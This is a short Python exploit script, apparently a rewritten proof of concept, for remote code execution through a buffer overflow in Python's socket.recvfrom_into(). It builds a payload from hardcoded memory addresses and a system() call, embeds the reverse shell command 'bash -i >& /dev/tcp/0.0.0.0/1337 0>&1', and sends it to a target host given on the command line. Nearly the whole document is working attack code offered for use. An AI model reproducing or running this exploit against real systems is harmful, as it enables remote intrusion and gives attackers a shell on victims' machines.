import struct
import socket
import sys

def off(o):
        return struct.pack('L',o)

''' 
rop = {
        'pop eax': off(0x80795ac),
        'call eax': off(0x817bb5b),
        'xor eax': off(0x8061379),
        'mov [eax], edx': off(0x8078cf6),
        'xor edx, edx': off(0x80a60d1),
}
'''

plt = {
        'system': off(0x805b7e0),
}

#addr2null = off(0x11111111)

ebx = 0xb7ae7908 
eax = ebx
eax2 = ebx+20
padd2 = 'X'*(144)
padd1 = 'Y'*(8)

system_command = 'bash -i >& /dev/tcp/0.0.0.0/1337 0>&1'

buff = 'aaaa' + off(eax) + padd1 + off(ebx) + padd2 +  plt['system'] + '||'+system_command+'x00'

try:
	ip = sys.argv[1]
	port = int(sys.argv[2])
	print("[*] Python 2.x/3.x Remote Code Execution in socket.recvfrom_into() based on PoC from @sha0coder - all credit to him.")
	print("[*] Quick rewrite: Dave Kennedy @ TrustedSec")
	print("[*] Sending the exploit to %s on port %s")
	print("[*] If successful, a shell will be listening on port 1337 on the remote victim")
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, port))
	# data = s.recv(512)
	s.send(buff)
	s.close()

except IndexError:
	print("Python 2.x/3.x Remote Code Execution (NX bypass) in socket.recvfrom_into() based on PoC from @sha0coder - all credit to him")
	print("Quick rewrite by: Dave Kennedy @ TrustedSec")
	print("Usage: python exploit.py")